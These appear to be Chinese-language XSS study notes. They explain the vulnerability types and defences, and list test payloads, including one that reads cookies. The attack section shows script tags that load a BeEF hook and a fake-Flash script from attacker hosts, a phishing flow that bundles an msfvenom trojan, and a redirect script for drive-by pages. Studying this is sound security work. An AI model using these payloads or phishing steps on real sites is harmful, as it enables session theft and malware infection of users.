### 一、概述
#### 1、漏洞原理
程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后，在输到前端时被浏览器当作有效代码解析执行从而产生危害
#### 2、漏洞危害
1. 网络钓鱼，包括获取各类用户账号
2. 窃取用户cookies资料，从而获取用户隐私信息
3. 劫持用户（浏览器）会话，从而执行任意操作
4. 强制弹出广告页面、刷流量等
5. 网页挂马
6. 结合其他漏洞，如csrf，实施进步危害
#### 3、xss漏洞探测
**常见出现xss位置：**
```
1. 登陆，注册，留言，评价，搜索等功能

2. 数据提交：get，post，cookie，header头部等

3. 各种插件，组件，富文本编辑器等

4. 只要是可以输入输出的地方，都可以尝试探测是否存在xss漏洞
```
**xss常用payload：**
```
1. <script>alert(1)</script>

2. <img src=x onerror=alert(1)>

3. <svg onload=alert(1)>

4. <a href=javascript:alert(1)>

5. <details open ontoggle= confirm(document[`coo`+`kie`])>
```

### 二、xss类型
#### 1、反射型
又称非持久型XSS，这种攻击方式往往具有一次性，只在用户单击时触发。跨站代码一般存在链接中，当受害者请求这样的链接时，跨站代码经过服务端反射回来，这类跨站的代码通常不存储服务端
![[Pasted image 20231221161227.png]]


#### 2、存储型xss
存储型XSS（ Stored xss Attacks），也是持久型XSS，比反射型XSS更具有威胁性。。攻击脚本将被永久的存放在目标服务器的数据库或文件中。这是利用起来最方便的跨站类型，跨站代码存储于服务端（比如数据库中）。
![[Pasted image 20231221161326.png]]

#### 3、dom型
DoM是文档对象模型（ Document Object Model）的缩写。它是HTML文档的对象表示，同时也是外部内容（例如 JavaScript）与HTML元素之间的接口。解析树的根节点是“ Document"对象。DOM（ Document object model），使用DOM能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。它是基于DoM文档对象的一种漏洞，并且DOM型XSS是基于JS上的，并不需要与服务器进行交互
![[Pasted image 20231221161421.png]]





### 三、xss攻击利用
#### 1、里一共xss平台进行利用
xss平台获取cookie：
	xss.yt
	xssaq.com
	自己搭建平台：xsshunter,xss_platform等
#### 2、beef-xss工具
下载：
```
apt intall beef-xss
```
payload：
```
<script src = "http://127.0.0.1:3000/hook.js"></script>
```
平台登录:
```
http://100.100.100.28:3000/ui/authentication
```
#### 3、flash钓鱼攻击
准备工作：
1. 先搭建钓鱼网站：https://github.com/crow821/FakeFlash
2. 插入恶意的Payload：<script src= "http://192.168.1.21:8000/flash.js"></script>
3. 使用msfvenom生成木马
4. 将木马和正常的flash安装程序绑定
5. 将生成后的exe程序放在自己网站上
6. 进入msf工具开启监听
7. 
触发流程：
	![[Pasted image 20231221164611.png]]


#### 4、xss网页挂马
在自己服务器新建恶意js文件：

```
const targetURL = "https://www.example.com";
function redirectToTarget() {
window.location.replace(targetURL);
}
document.addEventListener("DOMContentLoaded" , redirectToTarget);
```

Payload:
```
<script src= "http://xx.xx.xx.xx/indey.js" defer></script>
```
### 四、xss的防御和绕过
#### 1、绕过
**常见绕过方法：**
![[Pasted image 20231221164830.png]]


xss-labs绕过：
![[Pasted image 20231221164858.png]]

#### 2、防御：
设置关键词黑名单：包括`” ‘ ”,” “ ”,”<”,”>” “on*”`等非法字符。
设置http-only：只要 cookie 中含有 Http-only 字段，那么任何 JavaScript 脚本都没有权限读取这条 cookie 的内容
使用html实体编码等
SOP同源策略：SOP把拥有相同主机名 、协议和端口的页面视为同一来源。不同来源的资源之间交互是受到限制的